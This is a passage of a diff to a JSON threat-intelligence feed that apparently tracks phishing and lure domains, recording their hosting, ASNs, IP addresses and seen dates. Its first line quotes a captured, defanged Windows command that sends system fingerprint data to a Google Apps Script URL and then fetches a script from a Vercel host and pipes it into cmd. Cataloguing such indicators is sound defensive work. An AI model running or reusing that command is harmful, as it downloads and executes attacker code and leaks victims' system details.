+    "cmd.exe /c \"curl.exe -sL -d \"\"id=969546d9-9145-48f1-b480-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Frestyledjunk.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-03T09%3A15%3A57.576Z\"\" -d \"\"lastShellAt=2026-11-03T09%3A15%3A57.576Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
    ],
    "connects_to": [
     "fingerprint-veri.info",
@@ -188103,9 +188550,9 @@
    ],
    "lure_from": [
     "jscdncloude.beer",
+    "ncheck-brows.beer",
     "id-verfied.boats",
-    "interseq.at",
-    "ncheck-brows.beer"
+    "interseq.at"
    ]
   },
   {
@@ -189048,7 +189495,28 @@
      "last_seen": "2026-11-03"
     },
     {
+     "ip": "84.32.84.111",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-03",
+     "last_seen": "2026-11-03"
+    },
+    {
      "ip": "84.32.84.209",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-03",
+     "last_seen": "2026-11-03"
+    },
+    {
+     "ip": "92.113.23.142",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-03",
+     "last_seen": "2026-11-03"
+    },
+    {
+     "ip": "88.222.222.127",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-11-03",
@@ -189395,7 +189863,7 @@
    "product": null,
    "hosting": "Hostinger",
    "dns": "Hostinger",
-   "ip": "77.37.83.45",
+   "ip": "91.108.98.107",
    "asn": "AS47583",
    "org": "AS-HOSTINGER Hostinger International Limited, CY",
    "country": "NL",
@@ -189422,28 +189890,7 @@
      "last_seen": "2026-11-03"
     },
     {
-     "ip": "2a02:4780:33:d31d:e184:5efe:ea55:da4e",
-     "asn": "AS47583",
-     "org": "AS-HOSTINGER Hostinger International Limited, CY",
-     "first_seen": "2026-11-02",
-     "last_seen": "2026-11-03"
-    },
-    {
      "ip": "77.37.83.11",
-     "asn": "AS47583",
-     "org": "AS-HOSTINGER Hostinger International Limited, CY",
-     "first_seen": "2026-11-02",
-     "last_seen": "2026-11-03"
-    },
-    {
-     "ip": "77.37.83.45",
-     "asn": "AS47583",
-     "org": "AS-HOSTINGER Hostinger International Limited, CY",
-     "first_seen": "2026-11-02",
-     "last_seen": "2026-11-03"
-    },
-    {
-     "ip": "91.108.103.100",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-11-02",
@@ -189458,6 +189905,27 @@
     },
     {
      "ip": "91.108.98.107",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-02",
+     "last_seen": "2026-11-03"
+    },
+    {
+     "ip": "2a02:4780:33:d31d:e184:5efe:ea55:da4e",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-02",
+     "last_seen": "2026-11-03"
+    },
+    {
+     "ip": "77.37.83.45",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-02",
+     "last_seen": "2026-11-03"
+    },
+    {
+     "ip": "91.108.103.100",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-11-02",
@@ -196788,11 +197256,18 @@
    "product": null,
    "hosting": "Hostinger",
    "dns": "dns-parking.com",
-   "ip": "92.113.23.102",
+   "ip": "92.113.23.68",
    "asn": "AS47583",
    "org": "AS-HOSTINGER Hostinger International Limited, CY",
    "country": "DE",
    "ips": [
+    {
+     "ip": "92.113.23.68",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-02",
+     "last_seen": "2026-11-03"
+    },
     {
      "ip": "84.32.84.59",
      "asn": "AS47583",
@@ -196802,13 +197277,6 @@
     },
     {
      "ip": "92.113.23.102",
-     "asn": "AS47583",
-     "org": "AS-HOSTINGER Hostinger International Limited, CY",
-     "first_seen": "2026-11-02",
-     "last_seen": "2026-11-03"
-    },
-    {
-     "ip": "92.113.23.68",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-11-02",
@@ -197549,14 +198017,14 @@
    "country": null,
    "ips": [
     {
-     "ip": "104.21.45.6",
+     "ip": "172.67.207.12",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-01",
      "last_seen": "2026-11-03"
     },
     {
-     "ip": "172.67.207.12",
+     "ip": "104.21.45.6",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-01",
@@ -197782,13 +198250,20 @@
    "product": null,
    "hosting": "Hostinger",
    "dns": "dns-parking.com",
-   "ip": "2a02:4780:43:d7c0:f37:1f2e:4ac7:49ee",
+   "ip": "84.32.84.78",
    "asn": "AS47583",
    "org": "AS-HOSTINGER Hostinger International Limited, CY",
-   "country": "DE",
+   "country": "LT",
    "ips": [
     {
      "ip": "191.101.104.176",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-02",
+     "last_seen": "2026-11-03"
+    },
+    {
+     "ip": "84.32.84.78",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-11-02",
@@ -197803,13 +198278,6 @@
     },
     {
      "ip": "2a02:4780:43:d7c0:f37:1f2e:4ac7:49ee",
-     "asn": "AS47583",
-     "org": "AS-HOSTINGER Hostinger International Limited, CY",
-     "first_seen": "2026-11-02",
-     "last_seen": "2026-11-03"
-    },
-    {
-     "ip": "84.32.84.78",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-11-02",
@@ -199331,6 +199799,13 @@
    "country": "CY",
    "ips": [
     {
+     "ip": "2a02:4780:43:5478:d76a:6888:a6be:3fe2",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-03",
+     "last_seen": "2026-11-03"
+    },
+    {
      "ip": "2a02:4780:84:24:1a77:7169:43d2:6f91",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
@@ -199346,6 +199821,13 @@
     },
     {
      "ip": "92.113.23.232",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-03",
+     "last_seen": "2026-11-03"
+    },
+    {
+     "ip": "2.57.91.155",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-11-03",
@@ -200066,6 +200548,13 @@
      "last_seen": "2026-11-03"
     },
     {
+     "ip": "2a02:4780:44:2f41:5971:b88f:2b19:2fde",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-03",
+     "last_seen": "2026-11-03"
+    },
+    {
      "ip": "88.222.222.13",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
@@ -200081,6 +200570,13 @@
     },
     {
      "ip": "92.113.23.183",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-03",
+     "last_seen": "2026-11-03"
+    },
+    {
+     "ip": "2a02:4780:43:4486:2be2:e8ce:1750:93c0",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-11-03",
@@ -208896,7 +209392,7 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "one.com",
-   "ip": "141.193.213.20",
+   "ip": "141.193.213.21",
    "asn": "AS209242",
    "org": "CLOUDFLARESPECTRUM Cloudflare London, LLC, US",
    "country": "US",
@@ -220110,14 +220606,14 @@
    "country": "US",
    "ips": [
     {
-     "ip": "185.214.133.230",
+     "ip": "2a02:4780:b:844:0:2cc6:ac8:4",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-11-01",
      "last_seen": "2026-11-03"
     },
     {
-     "ip": "2a02:4780:b:844:0:2cc6:ac8:4",
+     "ip": "185.214.133.230",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-11-01",
@@ -220388,7 +220884,21 @@
      "last_seen": "2026-11-03"
     },
     {
+     "ip": "2a02:4780:45:5d8a:df7f:4535:2ee:7c37",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-03",
+     "last_seen": "2026-11-03"
+    },
+    {
      "ip": "2a02:4780:45:f2e7:9e8a:7c02:cda4:a1bb",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-03",
+     "last_seen": "2026-11-03"
+    },
+    {
+     "ip": "88.222.222.196",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-11-03",
@@ -237138,6 +237648,13 @@
    "country": "DE",
    "ips": [
     {
+     "ip": "191.101.104.238",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-03",
+     "last_seen": "2026-11-03"
+    },
+    {
      "ip": "2.57.91.124",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
@@ -237159,6 +237676,20 @@
      "last_seen": "2026-11-03"
     },
     {
+     "ip": "2a02:4780:84:6cbc:15d2:a3dd:9a3b:e4cc",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-03",
+     "last_seen": "2026-11-03"
+    },
+    {
+     "ip": "92.113.16.184",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-03",
+     "last_seen": "2026-11-03"
+    },
+    {
      "ip": "92.113.16.255",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
@@ -237167,6 +237698,13 @@
     },
     {
      "ip": "92.113.23.139",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-03",
+     "last_seen": "2026-11-03"
+    },
+    {
+     "ip": "92.113.23.124",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-11-03",
@@ -237534,7 +238072,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-10-26",
-   "last_seen": "2026-10-28",
+   "last_seen": "2026-11-03",
    "last_online": "2026-11-03",
    "offline_since": null,
    "url": "https://v79.ad/",
@@ -237542,11 +238080,25 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "104.21.56.135",
+   "ip": "2606:4700:3033::ac43:981d",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
+    {
+     "ip": "2606:4700:3033::ac43:981d",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-03",
+     "last_seen": "2026-11-03"
+    },
+    {
+     "ip": "172.67.152.29",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-03",
+     "last_seen": "2026-11-03"
+    },
     {
      "ip": "104.21.56.135",
      "asn": "AS13335",
@@ -237560,7 +238112,7 @@
      "host": "v79.ad",
      "status": "online",
      "first_seen": "2026-10-26",
-     "last_seen": "2026-10-28"
+     "last_seen": "2026-11-03"
     }
    ],
    "actor": null,
@@ -238479,18 +239031,11 @@
    "product": null,
    "hosting": "Hostinger",
    "dns": "dns-parking.com",
-   "ip": "191.101.104.59",
+   "ip": "92.113.23.254",
    "asn": "AS47583",
    "org": "AS-HOSTINGER Hostinger International Limited, CY",
-   "country": "US",
+   "country": "DE",
    "ips": [
-    {
-     "ip": "191.101.104.59",
-     "asn": "AS47583",
-     "org": "AS-HOSTINGER Hostinger International Limited, CY",
-     "first_seen": "2026-11-02",
-     "last_seen": "2026-11-03"
-    },
     {
      "ip": "2a02:4780:44:ed29:40e:fb6:75ff:7877",
      "asn": "AS47583",
@@ -238513,14 +239058,21 @@
      "last_seen": "2026-11-03"
     },
     {
-     "ip": "92.113.23.219",
+     "ip": "92.113.23.254",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-11-02",
      "last_seen": "2026-11-03"
     },
     {
-     "ip": "92.113.23.254",
+     "ip": "191.101.104.59",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-02",
+     "last_seen": "2026-11-03"
+    },
+    {
+     "ip": "92.113.23.219",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-11-02",
@@ -242193,11 +242745,18 @@
    "product": null,
    "hosting": "Hostinger",
    "dns": "dns-parking.com",
-   "ip": "2a02:4780:42:414e:cfdb:3229:841e:9a35",
+   "ip": "2a02:4780:42:d3e1:dc82:77d1:b3ce:34ea",
    "asn": "AS47583",
    "org": "AS-HOSTINGER Hostinger International Limited, CY",
    "country": "DE",
    "ips": [
+    {
+     "ip": "2a02:4780:42:d3e1:dc82:77d1:b3ce:34ea",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-02",
+     "last_seen": "2026-11-03"
+    },
     {
      "ip": "195.35.60.15",
      "asn": "AS47583",
@@ -242207,13 +242766,6 @@
     },
     {
      "ip": "2a02:4780:42:414e:cfdb:3229:841e:9a35",
-     "asn": "AS47583",
-     "org": "AS-HOSTINGER Hostinger International Limited, CY",
-     "first_seen": "2026-11-02",
-     "last_seen": "2026-11-03"
-    },
-    {
-     "ip": "2a02:4780:42:d3e1:dc82:77d1:b3ce:34ea",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-11-02",
@@ -242665,6 +243217,13 @@
     },
     {
      "ip": "2a02:4780:84:8c09:66b6:8a48:c3b1:bed2",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-03",
+     "last_seen": "2026-11-03"
+    },
+    {
+     "ip": "92.113.16.56",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-11-03",
@@ -244493,10 +245052,31 @@
      "last_seen": "2026-11-03"
     },
     {
+     "ip": "2.57.91.10",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-03",
+     "last_seen": "2026-11-03"
+    },
+    {
      "ip": "2a02:4780:43:72e:8d18:5f2c:d9a9:71de",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-11-02",
+     "last_seen": "2026-11-03"
+    },
+    {
+     "ip": "2a02:4780:44:85b9:f905:92e7:62f3:e58a",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-03",
+     "last_seen": "2026-11-03"
+    },
+    {
+     "ip": "2a02:4780:44:d5d1:2f5e:e19d:3d84:a7d5",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-03",
      "last_seen": "2026-11-03"
     },
     {
@@ -248875,10 +249455,10 @@
    "product": null,
    "hosting": "Hostinger",
    "dns": "dns-parking.com",
-   "ip": "84.32.84.21",
+   "ip": "92.113.16.219",
    "asn": "AS47583",
    "org": "AS-HOSTINGER Hostinger International Limited, CY",
-   "country": "LT",
+   "country": "DE",
    "ips": [
     {
      "ip": "2.57.91.125",
@@ -248895,28 +249475,7 @@
      "last_seen": "2026-11-03"
     },
     {
-     "ip": "212.1.212.50",
-     "asn": "AS47583",
-     "org": "AS-HOSTINGER Hostinger International Limited, CY",
-     "first_seen": "2026-11-02",
-     "last_seen": "2026-11-03"
-    },
-    {
      "ip": "2a02:4780:45:f8fd:101f:fd14:a171:41ca",
-     "asn": "AS47583",
-     "org": "AS-HOSTINGER Hostinger International Limited, CY",
-     "first_seen": "2026-11-02",
-     "last_seen": "2026-11-03"
-    },
-    {
-     "ip": "84.32.84.21",
-     "asn": "AS47583",
-     "org": "AS-HOSTINGER Hostinger International Limited, CY",
-     "first_seen": "2026-11-02",
-     "last_seen": "2026-11-03"
-    },
-    {
-     "ip": "92.113.16.127",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-11-02",
@@ -248931,6 +249490,27 @@
     },
     {
      "ip": "92.113.23.1",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-02",
+     "last_seen": "2026-11-03"
+    },
+    {
+     "ip": "212.1.212.50",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-02",
+     "last_seen": "2026-11-03"
+    },
+    {
+     "ip": "84.32.84.21",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-02",
+     "last_seen": "2026-11-03"
+    },
+    {
+     "ip": "92.113.16.127",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-11-02",
@@ -251572,18 +252152,11 @@
    "product": null,
    "hosting": "Hostinger",
    "dns": "dns-parking.com",
-   "ip": "92.113.23.236",
+   "ip": "2a02:4780:84:e5d5:cb6e:ef62:3ea1:cc73",
    "asn": "AS47583",
    "org": "AS-HOSTINGER Hostinger International Limited, CY",
-   "country": "DE",
+   "country": "CY",
    "ips": [
-    {
-     "ip": "2a02:4780:4b:ba18:bf16:7fa0:a05e:9b8e",
-     "asn": "AS47583",
-     "org": "AS-HOSTINGER Hostinger International Limited, CY",
-     "first_seen": "2026-11-02",
-     "last_seen": "2026-11-03"
-    },
     {
      "ip": "2a02:4780:4c:62e5:3ed:bfda:905c:8a8d",
      "asn": "AS47583",
@@ -251593,6 +252166,13 @@
     },
     {
      "ip": "2a02:4780:84:e5d5:cb6e:ef62:3ea1:cc73",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-02",
+     "last_seen": "2026-11-03"
+    },
+    {
+     "ip": "2a02:4780:4b:ba18:bf16:7fa0:a05e:9b8e",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-11-02",
